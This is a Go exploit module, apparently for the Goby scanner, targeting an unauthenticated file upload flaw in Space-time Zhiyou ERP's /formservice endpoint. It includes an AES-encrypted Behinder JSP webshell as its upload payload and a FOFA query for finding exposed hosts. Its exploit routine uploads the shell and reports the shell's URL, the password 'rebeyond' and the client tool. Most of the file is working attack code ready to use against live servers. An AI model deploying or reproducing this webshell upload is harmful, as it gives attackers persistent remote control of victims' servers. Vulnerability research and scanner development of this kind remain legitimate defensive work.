package exploits

import (
	"regexp"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Space-time Zhiyou ERP /formservice arbitrary file upload vulnerability",
    "Description": "<p>As a comprehensive solution provider of informatization in the pharmaceutical industry, its business covers ERP, CRM, WMS, mobile Internet and new retail of pharmaceuticals, smart pharmacies, and intelligent manufacturing, using information technology to help the industrial transformation of the pharmaceutical industry, and working with customers to build a big health industry.</p><p>There is an unauthorized file upload vulnerability in the ERP system, which can be exploited by attackers to gain server control permissions.</p>",
    "Product": "Spatio-temporal intelligent friend ERP",
    "Homepage": "https://bjskzy.com",
    "DisclosureDate": "2024-03-13",
    "PostTime": "2024-03-14",
    "Author": "兰公子",
    "FofaQuery": "body=\"login.jsp?login=null\"",
    "GobyQuery": "body=\"login.jsp?login=null\"",
    "Level": "3",
    "Impact": "<p>There is an unauthorized file upload vulnerability in the ERP system, which can be exploited by attackers to gain server control permissions.</p>",
    "Recommendation": "<p>The manufacturer has released a patch, please pay attention to the update of the manufacturer's homepage in time: <a href=\"https://bjskzy.com\">https://bjskzy.com</a><a href=\"https://www.sxskzy.com/about/\"></a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "choose",
            "type": "select",
            "value": "default,customize",
            "show": ""
        },
        {
            "name": "customize",
            "type": "input",
            "value": "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>",
            "show": "choose=customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/formservice?service=attachment.write&isattach=false&filename=1.jsp",
                "follow_redirect": false,
                "header": {
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close",
                    "Content-Length": "105"
                },
                "data_type": "text",
                "data": "<% out.println(\"test\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "filePath|lastbody|regex|(?:<root>)([\\s\\S]*)(?:</root>)"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/form/temp/{{{filePath}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        null
    ],
    "Tags": [
        "File Upload",
        "HW-2023"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.5",
    "Translation": {
        "CN": {
            "Name": "时空智友ERP /formservice 任意文件上传漏洞",
            "Product": "时空智友ERP",
            "Description": "<p>时空智友是医药行业信息化全面解决方案提供商,业务涵盖药店ERP、CRM、WMS、移动互联及医药新零售、智慧药店、智能智造,利用信息技术助力医药行业产业变革,与客户一起,共建大健康产业。</p><p>时空智友ERP系统存在未授权文件上传漏洞，攻击者可利用该漏洞获取服务器控制权限。</p>",
            "Recommendation": "<p>厂商已经发布补丁，请及时关注厂商主页更新：<a href=\"https://bjskzy.com\">https://bjskzy.com</a><a href=\"https://www.sxskzy.com/about/\"></a></p>",
            "Impact": "<p>时空智友ERP系统存在未授权文件上传漏洞，攻击者可利用该漏洞获取服务器控制权限。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Space-time Zhiyou ERP /formservice arbitrary file upload vulnerability",
            "Product": "Spatio-temporal intelligent friend ERP",
            "Description": "<p>As a comprehensive solution provider of informatization in the pharmaceutical industry, its business covers ERP, CRM, WMS, mobile Internet and new retail of pharmaceuticals, smart pharmacies, and intelligent manufacturing, using information technology to help the industrial transformation of the pharmaceutical industry, and working with customers to build a big health industry.<br></p><p>There is an unauthorized file upload vulnerability in the ERP system, which can be exploited by attackers to gain server control permissions.<br></p>",
            "Recommendation": "<p>The manufacturer has released a patch, please pay attention to the update of the manufacturer's homepage in time:&nbsp;<a href=\"https://bjskzy.com\">https://bjskzy.com</a><a href=\"https://www.sxskzy.com/about/\"></a><br></p>",
            "Impact": "<p>There is an unauthorized file upload vulnerability in the ERP system, which can be exploited by attackers to gain server control permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			choose := goutils.B2S(ss.Params["choose"])
			customize := goutils.B2S(ss.Params["customize"])
			password := "rebeyond"
			shell_type := "Behinder"

			//构造Post请求
			postRequestConfig := httpclient.NewPostRequestConfig("/formservice?service=attachment.write&isattach=false&filename=1.jsp")
			postRequestConfig.VerifyTls = false
			postRequestConfig.FollowRedirect = false
			postRequestConfig.Data = customize

			//请求
			rsp, err := httpclient.DoHttpRequest(expResult.HostInfo, postRequestConfig)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}

			// 资源存在
			if rsp.StatusCode != 200 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}

			returnRequestERP := rsp.Utf8Html
			reRequestERP := regexp.MustCompile(`<root>(.*?)</root>`)
			name := reRequestERP.FindStringSubmatch(returnRequestERP)

			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}

			ss.VulURL = expResult.HostInfo.FixedHostInfo

			if choose == "default" {
				expResult.Success = true
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/form/temp/" + name[1] + "\n"
				expResult.Output += "Password: " + password + "\n"
				expResult.Output += "WebShell tool: " + shell_type + "\n"
				return expResult
			}

			expResult.Success = true
			expResult.Output += "文件上传成功：WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/form/temp/" + name[1] + "\n"
			return expResult
		},
	))
}
